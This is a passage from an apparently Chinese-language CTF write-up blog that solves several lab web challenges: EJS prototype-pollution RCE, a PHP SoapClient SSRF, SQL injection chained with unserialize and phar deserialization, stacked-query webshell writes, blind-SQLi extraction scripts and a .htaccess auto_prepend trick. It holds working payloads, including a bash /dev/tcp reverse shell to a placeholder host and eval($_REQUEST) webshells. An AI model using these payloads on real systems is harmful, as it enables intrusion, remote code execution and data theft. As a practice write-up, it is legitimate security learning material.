  if(req.session.user.user!="ADMIN"){res.end("<script>alert('ADMIN is asked');history.go(-1);</script>")} 
  req.session.user.data = clone(req.body);
  res.end("<script>alert('success');history.go(-1);</script>");  
});
router.get('/info', function (req, res) {
  res.render('index',data={'user':res.outputFunctionName});
})
module.exports = router;
```

很明显是原型链污染, 而且模板引擎是 ejs, 可以配合污染来 rce

keyword 的绕过用到 nodejs 的大小写特性

```javascript
"ı".toUpperCase() == 'I'
```

总的流程就是先注册用户 `admın`, 然后用 `ADMIN` 登录, 再向 `/action` post json 数据, 最后访问 `/info` 进行 rce

payload

```javascript
{"__proto__":{"outputFunctionName":"_tmp1;global.process.mainModule.require('child_process').exec('bash -c \"bash -i >& /dev/tcp/xxxx/yyyy 0>&1\"');var __tmp2"}}
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211161915926.png)

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211161915602.png)

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211161916605.png)

## bestphp's revenge

```php
<?php
highlight_file(__FILE__);
$b = 'implode';
call_user_func($_GET['f'], $_POST);
session_start();
if (isset($_GET['name'])) {
    $_SESSION['name'] = $_GET['name'];
}
var_dump($_SESSION);
$a = array(reset($_SESSION), 'welcome_to_the_lctf2018');
call_user_func($b, $a);
?>
```

flag.php

```php
<?php
session_start();
echo 'only localhost can get flag!';
$flag = 'LCTF{*************************}';
if($_SERVER["REMOTE_ADDR"]==="127.0.0.1"){
       $_SESSION['flag'] = $flag;
   }
only localhost can get flag!
```

这道题思路挺好的, 卡了好久...

首先通过 call\_user\_func 结合 `$_POST` 参数可以用 extract 变量覆盖

然后结合 session\_start 可以传入数组参数的特性来自定义 php serialize handler

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211191612702.png)

之后构造 SoapClient 原生类进行 ssrf

最后通过 call\_user\_func 可以传入数组的特性来触发 SoapClient 的 \_\_call 方法

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211191613697.png)

```php
$a = array(reset($_SESSION), 'welcome_to_the_lctf2018');
call_user_func($b, $a);
```

这里通过 `reset($_SESSION)` 取得 session 数组里面的第一个值 (字符串), 然后调用对应类的 `welcome_to_the_lctf2018` 方法

不难发现 `$_SESSION['name']` 可控, 那么在 SoapClient 已经被反序列化好的情况下指定 `name=SoapClient`, 并且用变量覆盖使 `$b` 的值为 `call_user_func` , 就可以达到 `SoapClient->welcome_to_the_lctf2018` 的效果, 最终触发 ssrf

构造的时候有个注意点, 因为 flag 最后是写在 session 里的, 所以在 ssrf 发包的时候需要指定一个相同的 PHPSESSID cookie, 这样才能确保我们这边能够获取到 flag

payload 如下

```php
<?php
$a = new SoapClient(null,array('location' => 'http://127.0.0.1/flag.php', 'user_agent' => "111\r\nCookie: PHPSESSID=uns9hpdaos2m88tsi4ml2v0o42", 'uri' => 'test'));
$b = serialize($a);
echo '|'.urlencode($b);
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211191618240.png)

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211191618291.png)

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211191618440.png)

## [安洵杯 2019]不是文件上传

根据底下的 `Powered By wowouploadimage` 在 GitHub 找到源码

[https://github.com/Threezh1/wowouploadimage](https://github.com/Threezh1/wowouploadimage)

helper.php

```php
<?php
class helper {
	protected $folder = "pic/";
	protected $ifview = False; 
	protected $config = "config.txt";
	// The function is not yet perfect, it is not open yet.

	public function upload($input="file")
	{
		$fileinfo = $this->getfile($input);
		$array = array();
		$array["title"] = $fileinfo['title'];
		$array["filename"] = $fileinfo['filename'];
		$array["ext"] = $fileinfo['ext'];
		$array["path"] = $fileinfo['path'];
		$img_ext = getimagesize($_FILES[$input]["tmp_name"]);
		$my_ext = array("width"=>$img_ext[0],"height"=>$img_ext[1]);
		$array["attr"] = serialize($my_ext);
		$id = $this->save($array);
		if ($id == 0){
			die("Something wrong!");
		}
		echo "<br>";
		echo "<p>Your images is uploaded successfully. And your image's id is $id.</p>";
	}

	public function getfile($input)
	{
		if(isset($input)){
			$rs = $this->check($_FILES[$input]);
		}
		return $rs;
	}

	public function check($info)
	{
		$basename = substr(md5(time().uniqid()),9,16);
		$filename = $info["name"];
		$ext = substr(strrchr($filename, '.'), 1);
		$cate_exts = array("jpg","gif","png","jpeg");
		if(!in_array($ext,$cate_exts)){
			die("<p>Please upload the correct image file!!!</p>");
		}
	    $title = str_replace(".".$ext,'',$filename);
	    return array('title'=>$title,'filename'=>$basename.".".$ext,'ext'=>$ext,'path'=>$this->folder.$basename.".".$ext);
	}

	public function save($data)
	{
		if(!$data || !is_array($data)){
			die("Something wrong!");
		}
		$id = $this->insert_array($data);
		return $id;
	}

	public function insert_array($data)
	{	
		$con = mysqli_connect("127.0.0.1","root","root","pic_base");
		if (mysqli_connect_errno($con)) 
		{ 
		    die("Connect MySQL Fail:".mysqli_connect_error());
		}
		$sql_fields = array();
		$sql_val = array();
		foreach($data as $key=>$value){
			$key_temp = str_replace(chr(0).'*'.chr(0), '\0\0\0', $key);
			$value_temp = str_replace(chr(0).'*'.chr(0), '\0\0\0', $value);
			$sql_fields[] = "`".$key_temp."`";
			$sql_val[] = "'".$value_temp."'";
		}
		$sql = "INSERT INTO images (".(implode(",",$sql_fields)).") VALUES(".(implode(",",$sql_val)).")";
		echo $sql;
		mysqli_query($con, $sql);
		$id = mysqli_insert_id($con);
		mysqli_close($con);
		return $id;
	}

	public function view_files($path){
		if ($this->ifview == False){
			return False;
			//The function is not yet perfect, it is not open yet.
		}
		$content = file_get_contents($path);
		echo $content;
	}

	function __destruct(){
		# Read some config html
		$this->view_files($this->config);
	}
}

?>
```

show.php

```php
<!DOCTYPE html>
<html>
<head>
	<title>Show Images</title>
	<link rel="stylesheet" href="./style.css">
	<meta http-equiv="content-type" content="text/html;charset=UTF-8"/>
</head>
<body>

<h2 align="center">Your images</h2>
<p>The function of viewing the image has not been completed, and currently only the contents of your image name can be saved. I hope you can forgive me and my colleagues and I are working hard to improve.</p>
<hr>

<?php
include("./helper.php");
$show = new show();
if($_GET["delete_all"]){
	if($_GET["delete_all"] == "true"){
		$show->Delete_All_Images();
	}
}
$show->Get_All_Images();

class show{
	public $con;

	public function __construct(){
		$this->con = mysqli_connect("127.0.0.1","root","root","pic_base");
		if (mysqli_connect_errno($this->con)){ 
   			die("Connect MySQL Fail:".mysqli_connect_error());
		}
	}

	public function Get_All_Images(){
		$sql = "SELECT * FROM images";
		$result = mysqli_query($this->con, $sql);
		if ($result->num_rows > 0){
		    while($row = $result->fetch_assoc()){
		    	if($row["attr"]){
		    		$attr_temp = str_replace('\0\0\0', chr(0).'*'.chr(0), $row["attr"]);
					$attr = unserialize($attr_temp);
				}
		        echo "<p>id=".$row["id"]." filename=".$row["filename"]." path=".$row["path"]."</p>";
		    }
		}else{
		    echo "<p>You have not uploaded an image yet.</p>";
		}
		mysqli_close($this->con);
	}

	public function Delete_All_Images(){
		$sql = "DELETE FROM images";
		$result = mysqli_query($this->con, $sql);
	}
}
?>

<p><a href="show.php?delete_all=true">Delete All Images</a></p>
<p><a href="upload.php">Upload Images</a></p>

</body>
</html>
```

insert\_array 的时候存在 sql 注入, filename 可控, 然后结合 Get\_All\_Images 时的 unserialize 来反序列化 helper 类, 利用 \_\_destruct 方法读取 flag

```php
<?php
class helper {
    protected $ifview = True; 
    protected $config = "/flag";
}

echo str_replace(chr(0).'*'.chr(0),'\0\0\0',serialize(new helper()));

?>
```

注意属性必须得是 protected 的, 并且 00 字符替换要按照题目代码里面的来

测试发现 filename 不能存在 `/` 字符, 于是改成 hex, 即

```
123','1','1','1',0x4f3a363a2268656c706572223a323a7b733a393a225c305c305c30696676696577223b623a313b733a393a225c305c305c30636f6e666967223b733a353a222f666c6167223b7d);#.jpg
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211231206868.png)

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211231206297.png)

## [SUCTF 2018]MultiSQL

查询用户信息处存在盲注

```
http://506b995f-192c-4444-b540-0908e8922e84.node4.buuoj.cn:81/user/user.php?id=2-1
```

用户名处应该也有个二次注入的, 没继续研究

盲注用异或来连接, 可以读文件, 但跑的时间很长

根据题目提示改成了预编译, 估计过滤了一些字符, 于是转成十六进制

结合上传头像时图片保存的路径 /favicon, 猜测该目录可写 (网站根目录没有权限)

直接利用预编译语句 into outfile 写 shell

```
http://506b995f-192c-4444-b540-0908e8922e84.node4.buuoj.cn:81/user/user.php?id=1;set @a=0x73656c65637420273c3f706870206576616c28245f524551554553545b315d293b3f3e2720696e746f206f757466696c6520272f7661722f7777772f68746d6c2f66617669636f6e2f78782e70687027;prepare st from @a;execute st;
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211231238168.png)

## [RoarCTF 2019]Online Proxy

题目有点恶心, 感觉还是看源码会清楚一点...

```php
$last_ip = "";
$result = query("select current_ip, last_ip from ip_log where uuid = '".addslashes($uuid)."'");
if(count($result) > 0) {
    if($ip !== $result[0]['current_ip']) {
        $last_ip = $result[0]['current_ip'];

        query("delete from ip_log where uuid='".addslashes($uuid)."'");
    } else {
        $last_ip = $result[0]['last_ip'];
    }
}

query("insert into ip_log values ('".addslashes($uuid)."', '".addslashes($ip)."', '$last_ip');");

die("\n<!-- Debug Info: \n Duration: $time s \n Current Ip: $ip ".($last_ip !== "" ? "\nLast Ip: ".$last_ip : "")." -->");
```

第一次访问得到 current\_ip 并插入数据库, 第二次更改 xff 头访问会将之前的 current\_ip 作为 last\_ip, 然后将 last\_ip 无过滤拼接到 sql 语句, 之后再访问的时候就直接从查询结果中取出 last\_ip 并输出

思路就是第一次构造 xff 头 sql 注入, 第二次更改 ip 访问让 sql 注入的结果插入到数据库, 第三次保持之前的 ip 访问, 网站就会把结果返回出来

脚本如下

```python
import requests
import time

url = 'http://node4.buuoj.cn:26194'

flag = ''

i = 1

cookies = {'track_uuid': 'd9d157df-93ca-47a1-f438-f851d5ae0249'}

while True:

    min = 32
    max = 127

    while min < max:
        time.sleep(0.02)
        mid = (min + max) // 2
        print(chr(mid))

        payload = '1 \' and if(ascii(substr((select group_concat(F4l9_C01uMn) from F4l9_D4t4B45e.F4l9_t4b1e), {},1))>{}, 1, 0) and \'1\'=\'1'.format(i, mid)
        res1 = requests.get(url, headers={'X-Forwarded-For': payload}, cookies=cookies)
        res2 = requests.get(url, headers={'X-Forwarded-For': 'aa'}, cookies=cookies)
        res3 = requests.get(url, headers={'X-Forwarded-For': 'aa'}, cookies=cookies)
        if 'Last Ip: 1' in res3.text:
            min = mid + 1
        else:
            max = mid
    flag += chr(min)
    i += 1
    print('found', flag)
```

注意保持 cookie 相同

## [GXYCTF2019]BabysqliV3.0

其实是 phar 反序列化的题

登录框输入 admin / password (弱口令), 然后主页 url 格式如下

```
http://f1d213e6-b05b-41aa-a5a9-4d06f76033a9.node4.buuoj.cn:81/home.php?file=upload
```

猜测存在文件包含, 于是利用 php filter 读取 upload.php

```php
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /> 

<form action="" method="post" enctype="multipart/form-data">
	上传文件
	<input type="file" name="file" />
	<input type="submit" name="submit" value="上传" />
</form>

<?php
error_reporting(0);
class Uploader{
	public $Filename;
	public $cmd;
	public $token;
	

	function __construct(){
		$sandbox = getcwd()."/uploads/".md5($_SESSION['user'])."/";
		$ext = ".txt";
		@mkdir($sandbox, 0777, true);
		if(isset($_GET['name']) and !preg_match("/data:\/\/ | filter:\/\/ | php:\/\/ | \./i", $_GET['name'])){
			$this->Filename = $_GET['name'];
		}
		else{
			$this->Filename = $sandbox.$_SESSION['user'].$ext;
		}

		$this->cmd = "echo '<br><br>Master, I want to study rizhan!<br><br>';";
		$this->token = $_SESSION['user'];
	}

	function upload($file){
		global $sandbox;
		global $ext;

		if(preg_match("[^a-z0-9]", $this->Filename)){
			$this->cmd = "die('illegal filename!');";
		}
		else{
			if($file['size'] > 1024){
				$this->cmd = "die('you are too big (′▽`〃)');";
			}
			else{
				$this->cmd = "move_uploaded_file('".$file['tmp_name']."', '" . $this->Filename . "');";
			}
		}
	}

	function __toString(){
		global $sandbox;
		global $ext;
		// return $sandbox.$this->Filename.$ext;
		return $this->Filename;
	}

	function __destruct(){
		if($this->token != $_SESSION['user']){
			$this->cmd = "die('check token falied!');";
		}
		eval($this->cmd);
	}
}

if(isset($_FILES['file'])) {
	$uploader = new Uploader();
	$uploader->upload($_FILES["file"]);
	if(@file_get_contents($uploader)){
		echo "下面是你上传的文件：<br>".$uploader."<br>";
		echo file_get_contents($uploader);
	}
}

?>
```

简单反序列化, payload 如下

```php
<?php

class Uploader{
    public $Filename;
    public $cmd;
    public $token;
}

$a = new Uploader();
$a->cmd='eval($_REQUEST[1]);phpinfo();';
$a->token = 0;

$phar =new Phar("phar.phar"); 
$phar->startBuffering();
$phar->setStub("GIF89A<?php XXX __HALT_COMPILER(); ?>");
$phar->setMetadata($a);
$phar->addFromString("test.txt", "test");
$phar->stopBuffering();
?>
```

上传两次, 第二次 get 传参 name 为 phar 协议来触发反序列化

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211241303232.png)

## [EIS 2019]EzPOP

index.php

```php
<?php

class A {

    protected $store;

    protected $key;

    protected $expire;

    public function __construct($store, $key = 'flysystem', $expire = null) {
        $this->key = $key;
        $this->store = $store;
        $this->expire = $expire;
    }

    public function cleanContents(array $contents) {
        $cachedProperties = array_flip([
            'path', 'dirname', 'basename', 'extension', 'filename',
            'size', 'mimetype', 'visibility', 'timestamp', 'type',
        ]);

        foreach ($contents as $path => $object) {
            if (is_array($object)) {
                $contents[$path] = array_intersect_key($object, $cachedProperties);
            }
        }

        return $contents;
    }

    public function getForStorage() {
        $cleaned = $this->cleanContents($this->cache);

        return json_encode([$cleaned, $this->complete]);
    }

    public function save() {
        $contents = $this->getForStorage();

        $this->store->set($this->key, $contents, $this->expire);
    }

    public function __destruct() {
        if (!$this->autosave) {
            $this->save();
        }
    }
}

class B {

    protected function getExpireTime($expire): int {
        return (int) $expire;
    }

    public function getCacheKey(string $name): string {
        return $this->options['prefix'] . $name;
    }

    protected function serialize($data): string {
        if (is_numeric($data)) {
            return (string) $data;
        }

        $serialize = $this->options['serialize'];

        return $serialize($data);
    }

    public function set($name, $value, $expire = null): bool{
        $this->writeTimes++;

        if (is_null($expire)) {
            $expire = $this->options['expire'];
        }

        $expire = $this->getExpireTime($expire);
        $filename = $this->getCacheKey($name);

        $dir = dirname($filename);

        if (!is_dir($dir)) {
            try {
                mkdir($dir, 0755, true);
            } catch (\Exception $e) {
                // 创建失败
            }
        }

        $data = $this->serialize($value);

        if ($this->options['data_compress'] && function_exists('gzcompress')) {
            //数据压缩
            $data = gzcompress($data, 3);
        }

        $data = "<?php\n//" . sprintf('%012d', $expire) . "\n exit();?>\n" . $data;
        echo $data;
        $result = file_put_contents($filename, $data);

        if ($result) {
            return true;
        }

        return false;
    }

}

if (isset($_GET['src']))
{
    highlight_file(__FILE__);
}

$dir = "uploads/";

if (!is_dir($dir))
{
    mkdir($dir);
}
unserialize($_GET["data"]);
```

简单反序列化, 代码有点复杂, 不过从 \_\_destruct 往前一步一步看就能弄明白了

主要考点是利用 php filter 去除开头的 `<?php exit();?>` 脏字符, 以 base64 为例

```php
<?php

class A {

    protected $store;
    protected $key;
    protected $expire;

    public function __construct($store, $key, $expire){
        $this->store = $store;
        $this->key = $key;
        $this->expire = $expire;
    }
}

class B {
    public $options;
}

$b = new B();
$b->options = array(
    "prefix" => 'php://filter/write=convert.base64-decode/resource=',
    "serialize" => 'strval'
    );

$a = new A($b, '123.php', '456');

$a->autosave = False;
$a->cache = [];
$a->complete = "aaaPD9waHAgZXZhbCgkX1JFUVVFU1RbMTIzNF0pOz8+";

echo urlencode(serialize($a));
```

开头加三个 aaa 是为了凑出来 4 bytes

```
http://616b4e74-f26c-4f6f-b466-dc88612c52e1.node4.buuoj.cn:81/?data=O%3A1%3A%22A%22%3A6%3A%7Bs%3A8%3A%22%00%2A%00store%22%3BO%3A1%3A%22B%22%3A1%3A%7Bs%3A7%3A%22options%22%3Ba%3A2%3A%7Bs%3A6%3A%22prefix%22%3Bs%3A50%3A%22php%3A%2F%2Ffilter%2Fwrite%3Dconvert.base64-decode%2Fresource%3D%22%3Bs%3A9%3A%22serialize%22%3Bs%3A6%3A%22strval%22%3B%7D%7Ds%3A6%3A%22%00%2A%00key%22%3Bs%3A7%3A%22123.php%22%3Bs%3A9%3A%22%00%2A%00expire%22%3Bs%3A3%3A%22456%22%3Bs%3A8%3A%22autosave%22%3Bb%3A0%3Bs%3A5%3A%22cache%22%3Ba%3A0%3A%7B%7Ds%3A8%3A%22complete%22%3Bs%3A43%3A%22aaaPD9waHAgZXZhbCgkX1JFUVVFU1RbMTIzNF0pOz8%2B%22%3B%7D
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211241416338.png)

## [羊城杯2020]easyphp

```php
<?php
    $files = scandir('./'); 
    foreach($files as $file) {
        if(is_file($file)){
            if ($file !== "index.php") {
                unlink($file);
            }
        }
    }
    if(!isset($_GET['content']) || !isset($_GET['filename'])) {
        highlight_file(__FILE__);
        die();
    }
    $content = $_GET['content'];
    if(stristr($content,'on') || stristr($content,'html') || stristr($content,'type') || stristr($content,'flag') || stristr($content,'upload') || stristr($content,'file')) {
        echo "Hacker";
        die();
    }
    $filename = $_GET['filename'];
    if(preg_match("/[^a-z\.]/", $filename) == 1) {
        echo "Hacker";
        die();
    }
    $files = scandir('./'); 
    foreach($files as $file) {
        if(is_file($file)){
            if ($file !== "index.php") {
                unlink($file);
            }
        }
    }
    file_put_contents($filename, $content . "\nHello, world");
?>
```

只有 index.php 能够被解析, 猜测是利用 .htaccess 的 php\_value 属性设置 auto\_prepend\_file

参考文章 [https://blog.csdn.net/solitudi/article/details/116666720](https://blog.csdn.net/solitudi/article/details/116666720)

file 被过滤了, 并且 content 后面会加入脏字符, 可以通过 `\` 来转义

```
php_value auto_prepend_fi\
le .htaccess
#<?php system('cat /fla?');?>\
```

```
http://b63dd291-7b33-432f-a92d-b3bf76db2f08.node4.buuoj.cn:81/?filename=.htaccess&content=php_value+auto_prepend_fi\%0ale+.htaccess%0a%23<?php+system('cat /fla?');?>\
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211241500537.png)

## [SUCTF 2018]annonymous

```php
<?php

$MY = create_function("","die(`cat flag.php`);");
$hash = bin2hex(openssl_random_pseudo_bytes(32));
eval("function SUCTF_$hash(){"
    ."global \$MY;"
    ."\$MY();"
    ."}");
if(isset($_GET['func_name'])){
    $_GET["func_name"]();
    die();
}
show_source(__FILE__);
```

题目来源于 hitcon 2017

[https://lorexxar.cn/2017/11/10/hitcon2017-writeup/](https://lorexxar.cn/2017/11/10/hitcon2017-writeup/)

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211241532642.png)

大意是说通过 create\_function 创建的匿名函数其实是有名字的, 函数名为 `\x00lambda_%d`, `%d` 为数字, 依次递增

那么就可以通过 intruder 来爆破出这个数字

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211241535044.png)

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211241535656.png)

## [SWPU2019]Web4

登录框存在 sql 注入

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211241653148.png)

测试发现过滤了一些关键字, select 也被过滤了... 看了 wp 才发现是堆叠注入

堆叠注入可以用预编译绕过关键字过滤

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211241654519.png)

python 脚本

```python
import requests
import time
import json

dicts = r'{}_,.-0123456789AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz'

flag = ''

for i in range(1, 99999):
    for s in dicts:
        time.sleep(0.04)
        sql = 'select if(ascii(substr((select group_concat(flag) from flag),{},1))={}, sleep(2), 0)'.format(i, ord(s))
        payload = '\';prepare st from 0x{};execute st;'.format(''.join(map(lambda x: str(hex(ord(x))).replace('0x', ''), sql)))
        url = 'http://697bc918-3a4e-4630-b242-d992863b5859.node4.buuoj.cn:81/index.php?r=Login/Login'
        a = time.time()
        print(s)
        res = requests.post(url, data=json.dumps({
            'username': payload,
            'password': '123'
            }))
        b = time.time()
        if b -a >= 2:
            flag += s
            print('FOUND!!!',flag)
            break
```

跑出来是 `glzjin_wants_a_girl_friend.zip` , 于是下载该压缩包

网站是自己写的 mvc, 刚开始看没啥头绪, 然后看到了 extract

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211241656330.png)

变量覆盖, 但是 viewPath 这里是类的属性, 覆盖不了, 只能往加载的模板 userIndex 里再看看

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211241657054.png)

发现变量 `$img_file`, 可以读取文件, 遂改成 `/../flag.php`

```
http://697bc918-3a4e-4630-b242-d992863b5859.node4.buuoj.cn:81/index.php?r=User/Index&img_file=/../flag.php
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211241658142.png)
